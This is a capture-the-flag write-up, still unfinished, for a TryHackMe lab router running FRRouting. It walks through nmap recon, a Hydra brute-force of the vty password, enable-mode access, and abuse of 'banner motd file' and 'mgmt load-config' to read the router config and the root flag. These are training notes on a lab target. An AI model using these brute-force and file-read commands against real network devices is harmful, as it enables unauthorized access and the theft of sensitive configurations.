# Operation Takeover â€” TryHackMe Writeup

**Status:** WIP / pending final closure.
**Note:** FRRouting enumeration and `mgmt load-config` / `banner motd file` commands still need closure and explanation before extraction as a standalone technique.

**Target:** `TARGET_IP` (10.128.162.109 at time of solve)
**OS:** Linux (Network appliance â€” FRRouting)
**Difficulty:** Medium
**Tech stack:** OpenSSH, FRRouting 10.0 (vty on port 2623)

---

## Attack Chain Overview

```
nmap â†’ 22, 179 (BGP), 2623 (FRRouting vty)
    â†’
nc :2623 â†’ FRRouting 10.0, password prompt (Cisco-style single password)
    â†’
Hydra cisco brute-force â†’ password: arista
    â†’
enable â†’ arista â†’ privileged mode
    â†’
configure terminal â†’ banner motd file /etc/frr/frr.conf â†’ reconnect â†’ config leak
    â†’
mgmt load-config /root/flag.txt merge â†’ banner motd file /etc/frr/mgmt_debug.log â†’ flag
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [FRRouting VTY Brute Force](#2-frrouting-vty-brute-force)
3. [Privileged Mode Access](#3-privileged-mode-access)
4. [Configuration and Flag Exfiltration](#4-configuration-and-flag-exfiltration)
5. [Key Takeaways](#5-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full TCP port scan and service version detection.
# Why here: discover the FRRouting VTY service on port 2623.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
nmap -sVC -p22,2623 $TARGET -oN service
nmap -O $TARGET
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH |
| 179/tcp | tcpwrapped (BGP) |
| 2623/tcp | lmdp (FRRouting VTY) |

See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. FRRouting VTY Brute Force

```bash
# What it does: connect to the FRRouting VTY line via netcat.
# Why here: identify the service banner and confirm it uses a single Cisco-style password.
nc -v $TARGET 2623
# FRRouting (version 10.0)
# Password:
```

```bash
# What it does: brute-force the Cisco-style single-password authentication with Hydra.
# Why here: recover the VTY password to gain access to the routing console.
hydra -P /usr/share/wordlists/rockyou.txt $TARGET cisco -s 2623 -t 64 -f
# [2623][cisco] host: $TARGET   password: arista
```

Tools: [hydra](../../../tools/creds/hydra.md), [netcat](../../../tools/pivot/netcat.md).

---

## 3. Privileged Mode Access

```bash
# What it does: enter privileged (enable) mode on the FRRouting console.
# Why here: gain access to configuration commands and file-read primitives.
enable
# Password: arista
```

---

## 4. Configuration and Flag Exfiltration

FRRouting allows exposing local files via `banner motd file`. Pointing this at sensitive files and reconnecting reveals the content as the MOTD banner.

```bash
# What it does: set the MOTD banner to the contents of the FRR configuration file.
# Why here: exfiltrate the running router configuration by abusing the banner-file feature.
configure terminal
banner motd file /etc/frr/frr.conf

# What it does: reconnect to the VTY to view the banner with the leaked config.
# Why here: read the exfiltrated file content displayed as the login banner.
nc -v $TARGET 2623
```

```bash
# What it does: load the root flag into the management configuration context.
# Why here: force the flag content into a debug log that can be read via banner motd.
mgmt load-config /root/flag.txt merge
banner motd file /etc/frr/mgmt_debug.log
```

---

## 5. Key Takeaways

- Network appliance VTY lines with single-password auth are trivially brute-forced â€” Hydra's `cisco` module handles this natively.
- FRRouting's `banner motd file` is a local file read primitive when you have `configure terminal` access. It is the equivalent of `LOAD_FILE()` in MySQL.
- `mgmt load-config <path> merge` can force file content into the management debug log, creating a second exfiltration path.
- Always test for Cisco-style `enable` password reuse — the same password often works for both the VTY line and the enable prompt.

---

## Related Notes
- [hydra](../../../tools/creds/hydra.md) — VTY brute force
- [netcat](../../../tools/pivot/netcat.md) — console access
- [nmap](../../../tools/recon/nmap.md) — initial port discovery
- [frrouting-vty-banner-file-read](../../../exploits/network-services/frrouting-vty-banner-file-read.md) — full technique note
